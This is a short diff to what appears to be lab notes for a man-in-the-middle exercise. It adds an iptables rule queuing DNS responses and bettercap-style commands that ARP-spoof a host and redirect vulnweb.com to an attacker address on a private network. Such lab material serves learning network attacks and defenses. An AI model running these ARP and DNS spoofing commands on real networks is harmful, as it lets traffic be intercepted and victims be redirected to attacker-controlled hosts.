@@ -227,11 +227,17 @@ vulnweb.com 192.168.7.54
 ```
 
 ```
+sudo iptables -A FORWARD -p udp --sport 53 -j NFQUEUE --queue-num 1
+```
+
+```
 net.probe on
   
 set arp.spoof.fullduplex true
 set arp.spoof.targets 192.168.7.53
 arp.spoof on
+
+set nfqueue.queue 1
 
 set dns.spoof.domains vulnweb.com
 set dns.spoof.address 192.168.7.54
